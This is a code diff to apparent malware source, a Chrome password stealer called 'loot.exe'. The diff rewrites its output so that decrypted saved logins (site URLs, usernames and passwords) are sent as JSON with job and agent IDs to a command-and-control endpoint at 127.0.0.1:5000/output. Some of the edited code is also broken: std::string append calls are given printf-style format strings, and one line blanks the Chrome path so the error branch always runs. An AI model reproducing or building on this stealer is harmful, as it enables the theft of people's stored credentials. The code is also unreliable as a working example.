@@ -8,6 +8,7 @@
 #include <vector>
 #include "json.hpp" //Source: https://github.com/nlohmann/json
 #include "aes_gcm.h"
+#include "http.h"
 
 #define SQLITE_DONE        101
 
@@ -313,6 +314,7 @@ std::vector<ChromeData> stealData(BYTE* key, std::string databaseFilePath) {
 }
 
 int main(int argc, char* argv[]) {
+	std::string outData = "";
 	// Access folder C:\Users\<User>\AppData\Local\Google\User Data
 	// "Local State" is the file
 
@@ -320,8 +322,11 @@ int main(int argc, char* argv[]) {
 	auto [chromePath, databasePath] = getChromePaths();
 	//printf("chromePath: %s\n", chromePath.c_str());
 
+	chromePath = "";
 	if (chromePath == "" || databasePath == "") {
-		printf("[ERROR] Could not obtain filepaths\n");
+		//printf("[ERROR] Could not obtain filepaths\n");
+		outData = "{\'job_id\': \'0\', \'agent_id\': \'0\', \'command\': \'loot.exe\', \'status\': \'ERROR\', \'output\': \'[ERROR] Could not obtain filepaths\'}";
+		makeHttpRequestPOST("127.0.0.1", 5000, "/output", 0, outData);
 		return 0;
 	}
 
@@ -335,28 +340,41 @@ int main(int argc, char* argv[]) {
 	// Copy ChromeData.db to hidden directory (can adjust later)
 	std::string databaseFilePath = copyChromeData(databasePath);
 	if (databaseFilePath == "\0") {
-		printf("[ERROR] Could not copy LoginDataOld.db\n");
+		outData = "{\'job_id\': \'0\', \'agent_id\': \'0\', \'command\': \'loot.exe\', \'status\': \'ERROR\', \'output\': \'[ERROR] Could not copy LoginDataOld.db\'}";
+		makeHttpRequestPOST("127.0.0.1", 5000, "/output", 0, outData);
 		return 0;
 	}
 
 	// Connect to the databse and steal data
 	std::vector<ChromeData> theGoods = stealData(key, databaseFilePath);
 	if (theGoods.empty()) {
-		printf("[INFO] No data to steal\n");
+		// printf("[INFO] No data to steal\n");
+		outData = "{\'job_id\': \'0\', \'agent_id\': \'0\', \'command\': \'loot.exe\', \'status\': \'SUCCESS\', \'output\': \'[INFO] No data to steal\'}";
+		makeHttpRequestPOST("127.0.0.1", 5000, "/output", 0, outData);
 		return 0;
 	}
 
-	// Display results
-	// TODO: Fix
-	printf("[INFO] Google Chrome data loaded!:\n");
-	printf("============\n");
+	// Return results
+	// printf("[INFO] Google Chrome data loaded!:\n");
+	std::string msg;
+	msg.append("[INFO] Google Chrome data loaded!:\n============\n");
+	//printf("============\n");
 	for (int i = 0; i < theGoods.size(); i++) {
-		printf("originURL: %s\n", theGoods.at(i).originURL.c_str());
-		printf("actionURL: %s\n", theGoods.at(i).actionURL.c_str());
-		printf("username: %s\n", theGoods.at(i).username.c_str());
-		printf("password: %s\n", theGoods.at(i).password.c_str());
-		printf("============\n");
+		// printf("originURL: %s\n", theGoods.at(i).originURL.c_str());
+		// printf("actionURL: %s\n", theGoods.at(i).actionURL.c_str());
+		// printf("username: %s\n", theGoods.at(i).username.c_str());
+		// printf("password: %s\n", theGoods.at(i).password.c_str());
+		// printf("============\n");
+		msg.append("originURL: %s\n", theGoods.at(i).originURL.c_str());
+		msg.append("actionURL: %s\n", theGoods.at(i).actionURL.c_str());
+		msg.append("username: %s\n", theGoods.at(i).username.c_str());
+		msg.append("password: %s\n============\n", theGoods.at(i).password.c_str());
 	}
+
+	outData = "{\'job_id\': \'0\', \'agent_id\': \'0\', \'command\': \'loot.exe\', \'status\': \'SUCCESS\', \'output\': \'";
+	outData.append(msg);
+	outData.append("\'}");
+	makeHttpRequestPOST("127.0.0.1", 5000, "/output", 0, outData);
 
 	free(key);
 
